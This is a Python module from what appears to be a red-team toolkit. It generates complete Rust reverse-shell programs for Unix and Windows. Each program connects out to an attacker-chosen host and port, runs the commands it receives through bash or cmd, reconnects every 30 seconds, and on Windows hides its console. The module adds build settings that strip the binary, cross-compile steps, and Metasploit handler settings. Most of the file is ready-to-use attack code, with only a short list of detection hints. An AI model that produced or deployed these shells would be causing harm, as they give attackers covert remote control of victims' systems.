"""
Rust reverse shell generator.
Generates Rust source code for a cross-platform reverse shell binary.
For use in authorized red team exercises only.
"""
from .base import (
    RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler, LISTENER_FMT, build_listener_setup,
)

_MITRE_TECHNIQUES = ["T1059", "T1027"]
_DETECTIONS = [
    "Rust binaries have characteristic section names and import tables",
    "Outbound TCP connection from unusual binary without DNS pre-query",
    "Process spawning cmd.exe/bash as child with stdio redirected to socket",
]

_RUST_UNIX_TEMPLATE = """\
use std::io::{{BufRead, BufReader, Write}};
use std::net::TcpStream;
use std::process::{{Command, Stdio}};
use std::thread;
use std::time::Duration;

fn connect(host: &str, port: u16) {{
    let addr = format!("{{}}:{{}}", host, port);
    loop {{
        if let Ok(mut stream) = TcpStream::connect(&addr) {{
            let reader = stream.try_clone().expect("clone failed");
            let mut reader = BufReader::new(reader);
            loop {{
                let mut line = String::new();
                match reader.read_line(&mut line) {{
                    Ok(0) | Err(_) => break,
                    Ok(_) => {{
                        let cmd = line.trim();
                        if cmd == "exit" {{ break; }}
                        let output = Command::new("bash")
                            .arg("-c")
                            .arg(cmd)
                            .stdout(Stdio::piped())
                            .stderr(Stdio::piped())
                            .output()
                            .map(|o| {{
                                let mut out = String::from_utf8_lossy(&o.stdout).to_string();
                                out.push_str(&String::from_utf8_lossy(&o.stderr));
                                out
                            }})
                            .unwrap_or_else(|e| format!("error: {{}}\\n", e));
                        let _ = stream.write_all(output.as_bytes());
                        let _ = stream.write_all(b"$ ");
                        let _ = stream.flush();
                    }}
                }}
            }}
        }}
        thread::sleep(Duration::from_secs(30));
    }}
}}

fn main() {{
    connect("{lhost}", {lport});
}}
"""

_RUST_WIN_TEMPLATE = """\
#![windows_subsystem = "windows"]
use std::io::{{BufRead, BufReader, Write}};
use std::net::TcpStream;
use std::process::{{Command, Stdio}};
use std::thread;
use std::time::Duration;

fn connect(host: &str, port: u16) {{
    let addr = format!("{{}}:{{}}", host, port);
    loop {{
        if let Ok(stream) = TcpStream::connect(&addr) {{
            let stdin_stream = stream.try_clone().unwrap();
            let stdout_stream = stream.try_clone().unwrap();
            let stderr_stream = stream.try_clone().unwrap();

            let _ = Command::new("cmd.exe")
                .stdin(Stdio::from(stdin_stream.into_std_tcp_stream()))
                .stdout(Stdio::from(stdout_stream.into_std_tcp_stream()))
                .stderr(Stdio::from(stderr_stream.into_std_tcp_stream()))
                .spawn()
                .and_then(|mut c| {{ c.wait() }});
        }}
        thread::sleep(Duration::from_secs(30));
    }}
}}

// Conversion helpers (Rust doesn't expose into_std_tcp_stream directly)
trait IntoStdStream {{
    fn into_std_tcp_stream(self) -> std::net::TcpStream;
}}

impl IntoStdStream for TcpStream {{
    fn into_std_tcp_stream(self) -> std::net::TcpStream {{
        self
    }}
}}

fn main() {{
    connect("{lhost}", {lport});
}}
"""

_RUST_WIN_SAFE_TEMPLATE = """\
#![windows_subsystem = "windows"]
// Safe cross-platform Windows reverse shell — avoids unsafe blocks
use std::io::{{BufRead, BufReader, Write}};
use std::net::TcpStream;
use std::process::{{Command, Stdio}};
use std::thread;
use std::time::Duration;

fn shell_loop(mut stream: TcpStream) {{
    let reader_clone = stream.try_clone().expect("stream clone");
    let mut reader = BufReader::new(reader_clone);
    loop {{
        let mut cmd = String::new();
        match reader.read_line(&mut cmd) {{
            Ok(0) | Err(_) => break,
            Ok(_) => {{
                let trimmed = cmd.trim();
                if trimmed.is_empty() {{ continue; }}
                if trimmed == "exit" {{ break; }}
                let result = Command::new("cmd")
                    .args(["/C", trimmed])
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .output();
                let response = match result {{
                    Ok(out) => {{
                        let mut r = String::from_utf8_lossy(&out.stdout).to_string();
                        r.push_str(&String::from_utf8_lossy(&out.stderr));
                        r
                    }},
                    Err(e) => format!("[error] {{}}\\n", e),
                }};
                let _ = stream.write_all(response.as_bytes());
                let _ = stream.write_all(b"C:\\> ");
                let _ = stream.flush();
            }}
        }}
    }}
}}

fn main() {{
    let addr = format!("{lhost}:{lport}");
    loop {{
        if let Ok(stream) = TcpStream::connect(&addr) {{
            shell_loop(stream);
        }}
        thread::sleep(Duration::from_secs(30));
    }}
}}
"""


class RustGenerator(ShellGenerator):
    language = "rust"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        is_windows = opts.arch in ("x86", "x64") or opts.arch == "any"

        if is_windows:
            source = _RUST_WIN_SAFE_TEMPLATE.format(lhost=opts.lhost, lport=opts.lport)
            variant = "windows_cmd"
            cargo_toml = (
                "[package]\n"
                "name = \"shell\"\n"
                "version = \"0.1.0\"\n"
                "edition = \"2021\"\n\n"
                "[profile.release]\n"
                "strip = true\n"
                "opt-level = 3\n"
                "lto = true\n"
                "codegen-units = 1\n"
            )
            compile_hint = (
                "cargo build --release\n"
                "# Cross-compile to Windows from Linux:\n"
                "rustup target add x86_64-pc-windows-gnu\n"
                "cargo build --release --target x86_64-pc-windows-gnu"
            )
        else:
            source = _RUST_UNIX_TEMPLATE.format(lhost=opts.lhost, lport=opts.lport)
            variant = "unix_bash"
            cargo_toml = (
                "[package]\n"
                "name = \"shell\"\n"
                "version = \"0.1.0\"\n"
                "edition = \"2021\"\n\n"
                "[profile.release]\n"
                "strip = true\n"
                "opt-level = 3\n"
                "lto = true\n"
            )
            compile_hint = "cargo build --release && strip target/release/shell"

        command = (
            f"# Rust reverse shell — {variant}\n"
            f"# Requirements: rustup, cargo\n\n"
            f"# 1. Create project: cargo new shell && cd shell\n"
            f"# 2. Replace Cargo.toml:\n\n"
            f"# --- Cargo.toml ---\n"
            f"{cargo_toml}\n"
            f"# --- src/main.rs ---\n"
            f"{source}\n"
            f"# 3. Compile:\n"
            f"# {compile_hint}"
        )

        return ShellResult(
            command=command,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=None,
            msf_compat=msf_handler(
                "windows/x64/shell/reverse_tcp" if is_windows else "cmd/unix/reverse",
                opts.lhost, opts.lport,
            ),
            listener_setup=build_listener_setup(opts.lhost, opts.lport),
            techniques=_MITRE_TECHNIQUES,
            risk="HIGH",
            detections=_DETECTIONS,
        )
